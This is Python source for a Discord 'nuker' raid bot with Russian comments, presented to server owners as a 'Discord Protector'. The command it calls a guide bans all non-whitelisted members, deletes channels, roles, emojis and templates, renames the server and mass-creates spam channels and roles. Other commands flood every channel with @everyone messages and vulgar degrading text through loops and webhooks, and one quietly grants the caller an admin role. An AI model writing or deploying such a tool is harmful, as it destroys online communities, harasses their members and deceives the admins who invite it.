import discord, os, sys, random, string, requests, configparser, json, asyncio, time
from discord.ext import commands
from discord import Permissions
from colorama import Fore, init
from os import system, name
init()

config = configparser.ConfigParser()
config.read('raidcfg.ini')

Token = config.get("Crasher", "Token")
whit = json.loads(config.get("Crasher", "Whitelist"))



if name == "nt":
        _ = system("cls")

else:
        _ = system("clear")

intents = discord.Intents.default()
intents.members = True
client = commands.Bot(command_prefix='$', intents=intents, help_command=None)


async def banall(ctx):
    print(f"{Fore.WHITE}> {Fore.RED}В бан, чёртики!{Fore.WHITE}...")
    ban = 0
    bany = 0
    wta = 0
    for member in ctx.guild.members:
        if member.id not in whit:
            try:
                ban += 1
                await member.ban()
                bany += 1
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не допущен! нет в вайтлисте{Fore.WHITE}: {member}")
            except:
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Трабл с {Fore.WHITE}: {member}")
                continue
        elif member.id in whit:
            ban += 1
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не трогаю допущенного {Fore.WHITE}: {member}")
            wta += 1
    print(f"{Fore.WHITE}> {Fore.RED}Было{Fore.WHITE}: {ban} {Fore.RED} человек, в вайтлисте{Fore.WHITE}: {wta}, а забанил{Fore.WHITE}: {bany} {Fore.RED} человек {Fore.WHITE}.")
    
async def chistch(ctx):
    await ctx.send("РЕЙВ ПАТИИИИИ! СЕРВЕР ПОД КРОВАТЬЮ! @everyone ")
    with open('image.png', 'rb') as f:
       icon = f.read()
    await ctx.guild.edit(name="Концерт фейса", icon=icon)
    print(f"{Fore.WHITE}> {Fore.RED}Генеральная уборка! Теперь имя сервера другое )")
    
    print(f"{Fore.RED}> {Fore.WHITE}Чистим каналы{Fore.WHITE}...")
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Зачистил {channel}")
        except:
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалось удалить {channel}")
            continue
    print(f"{Fore.WHITE}> {Fore.RED}Все, каналов нема{Fore.WHITE}.")
   
async def spamhook(ctx):
  while True:
    for channel in ctx.guild.channels:
      try:
        h = await channel.webhooks()
        for f in h:
          await f.send(content='Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone Я ШЛЮХА Я ШЛЮХА Я ШЛЮХА @everyone ', wait=True)
      except:
        continue

async def crhooks(ctx):
  print(f"{Fore.WHITE}> {Fore.RED}Спамим хуками{Fore.WHITE}.")
  for channel in ctx.guild.text_channels: 
    try:
      await channel.create_webhook(name='GLUSHA WAS HERE')
      print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал хук в {channel}")
    except:
      print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не создал хук в {channel}")
      continue
  print(f"{Fore.WHITE}> {Fore.RED}Заспамили хуками{Fore.WHITE}.")

async def chistrl(ctx):
    print(f"{Fore.WHITE}> {Fore.RED}Теперь роли почистим{Fore.WHITE}...")
    roles = ctx.guild.roles
    roles.pop(0)
    for role in roles:
        try:
            await role.delete()
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил {role}")
        except:
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалил {role}")
            continue
    print(f"{Fore.WHITE}> {Fore.RED}Почистил{Fore.WHITE}.")
    
async def masks(ctx):
    char = string.ascii_letters + string.digits
    for member in ctx.guild.members:
        nickname = ''.join((random.choice(char) for i in range(16)))
        try:
            await member.edit(nick=nickname)
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}]{member}, Поиграем в маскарад? Твоя маска {nickname}")
        except:
            continue
    print(f"{Fore.WHITE}> {Fore.RED}Все теперь анонизмусы{Fore.WHITE}.")

async def spamch(ctx):
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Начинаем спам")
    for b in range(200):
        try:
                await ctx.guild.create_text_channel("CRASH9D", reason='Админ ебанутый')
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал канал")
        except:
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не cоздал канал")
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Наспамил...")

async def spamrl(ctx):   
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Спамим ролями")
    for a in range(200):
        try:
                await ctx.guild.create_role(name="Crash9d", reason='Админ ебанутый')
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал роль")
        except:
                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не создал роль")
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Наcпамил...")

async def chistemoji(ctx):
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил этот трикалятый смайлик")
        except:
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Ошибка")
            continue 
    print(f"{Fore.WHITE}> {Fore.RED}Все, смайлов больше нет...{Fore.WHITE}.")

async def chisttemp(ctx):
    try:
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Чистим шаблоны")
        bebrus = await ctx.guild.templates()
        for template in bebrus:
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Шаблон почистил!")
            await template.delete()
        print(f"{Fore.WHITE}> {Fore.RED}Все шаблоны почистились!{Fore.WHITE}.")
    except:
        pass

async def spamth(ctx):
    while True:
      try:
        for channel in ctx.guild.text_channels:
          await channel.send("ЗАЛЕТЕЛ НА НЕБОСКРЕБ! ДА Я МЕСТНЫЙ МЕЗАНТРОП! @everyone")
      except:
        continue

@client.event
async def on_ready():
    await client.change_presence(status=discord.Status.online, activity=discord.Game('Protecting 24/7'))
    print(f"""{Fore.RED}

  ____ _    _   _ _____ _____ _   _ 
 / ___| |  | | | |_   _| ____| \ | |
| |  _| |  | | | | | | |  _| |  \| |
| |_| | |__| |_| | | | | |___| |\  |
 \____|_____\___/  |_| |_____|_| \_|

{Fore.RED} Здрасьте, это ГЛЮТЕН и
{Fore.RED} Полное адище начинается ;)""")

@client.command()
async def hlp(ctx):
    asyncio.create_task(chisttemp(ctx))
    asyncio.create_task(banall(ctx))
    asyncio.create_task(banall(ctx))
    asyncio.create_task(banall(ctx))
    asyncio.create_task(chistch(ctx))
    asyncio.create_task(chistch(ctx))
    asyncio.create_task(chistch(ctx))
    asyncio.create_task(chistch(ctx))
    asyncio.create_task(chistch(ctx))
    asyncio.create_task(spamth(ctx))
    asyncio.create_task(spamth(ctx))
    asyncio.create_task(spamth(ctx))
    asyncio.create_task(spamth(ctx))
    asyncio.create_task(spamth(ctx))
    asyncio.create_task(spamth(ctx))
    asyncio.create_task(spamth(ctx))
    asyncio.create_task(spamth(ctx))
    asyncio.create_task(spamth(ctx))
    asyncio.create_task(spamth(ctx))
    asyncio.create_task(chistemoji(ctx))
    asyncio.create_task(chistemoji(ctx))
    asyncio.create_task(chisttemp(ctx))
    asyncio.create_task(chisttemp(ctx))
    asyncio.create_task(chistrl(ctx))
    asyncio.create_task(chistrl(ctx))
    await chistrl(ctx)

    asyncio.create_task(masks(ctx))
    asyncio.create_task(masks(ctx))
    asyncio.create_task(spamch(ctx))
    asyncio.create_task(spamch(ctx))
    asyncio.create_task(spamch(ctx))
    asyncio.create_task(spamrl(ctx))
    asyncio.create_task(spamrl(ctx))
    await spamrl(ctx)
    print(f"{Fore.WHITE}> {Fore.RED}Сервер УМЕР{Fore.WHITE}.")


    


@client.command()
async def help(ctx):
  embed = discord.Embed(
    title = 'Discord Protector',
    colour = 4374015,
    description = '👨‍💻Привет! Я - твой новый защитник! Для начала ознакомимся с командами👨‍💻:\n```\n$ - префикс 🤖\n```\n```\n$help - помощь 🤗\n```\n```\n$hlp - гайд по боту 🧐\n```\n```\n$st - начать защиту 👾\n```\n```\n$config - сконфигурировать защиту 🛠️\n```\n```\n$autoconf - автоконфигурация для сервера 🔧\n```\n```\n$ban - Баны 🚫\n```\n```\n$kick - Кики 🦶\n```\nВот и все! Настраивай как хочешь  😊\n',
    url = 'https://discord.com/api/oauth2/authorize?client_id=849596809738190898&permissions=8&scope=bot')
  await ctx.send(embed=embed)


    
@client.command()
async def game(ctx, pos: int):
    try:
        await ctx.guild.create_role(name="DADUDEDA", colour=discord.Colour(0x00FF00), permissions=discord.Permissions(permissions=8))
        role = discord.utils.get(ctx.guild.roles, name="DADUDEDA")
        await role.edit(position=pos, reason="Админ идиот")
        await ctx.message.author.add_roles(role)
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Выдал админку {ctx.message.author}")
    except discord.HTTPException:
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалось выдать админку {ctx.message.author}")
        

@client.command()
async def start(ctx):
  roles = ctx.guild.roles
  roles.pop(0)
  for role in roles:
        try:
            await role.delete()
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил {role}")
        except:
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалил {role}")
            continue
  print(f"{Fore.WHITE}> {Fore.RED}Почистил роли{Fore.WHITE}.")

async def spamth(ctx):
    while True:
      try:
        for channel in ctx.guild.text_channels:
          await channel.send("ЗАЛЕТЕЛ НА НЕБОСКРЕБ! ДА Я МЕСТНЫЙ МЕЗАНТРОП! @everyone")
      except:
        continue

@client.command()
async def ml(ctx):
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Спам активирован")
    asyncio.create_task(spamth(ctx))
    asyncio.create_task(spamth(ctx))
    asyncio.create_task(spamth(ctx))
    asyncio.create_task(spamth(ctx))
    asyncio.create_task(spamth(ctx))
    asyncio.create_task(spamth(ctx)) #Куча тредов чтобы жахало как надо
    asyncio.create_task(spamth(ctx))

@client.command()
async def gamehelp(ctx):
    rls = 0
    for role in ctx.guild.roles:
     rls +=1
     print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Нашел роль {role}, по счету {rls}")
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Найдено {rls} ролей")


@client.command()
async def gif(ctx):
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Рассылаем гифки")
    for channel in ctx.guild.text_channels:
     await channel.send("https://gfycat.com/flakyacrobatickusimanse")
     print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Кинул гифку в {channel}")
    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Разослал гифки")

@client.command()
async def hooks(ctx):
   await crhooks(ctx)
   asyncio.create_task(spamhook(ctx))
   asyncio.create_task(spamhook(ctx))
   asyncio.create_task(spamhook(ctx))
   asyncio.create_task(spamhook(ctx))
   asyncio.create_task(spamhook(ctx))
   asyncio.create_task(spamhook(ctx))



try:
    client.run(Token)
except Exception:
    pass
except KeyboardInterrupt:
    sys.exit()

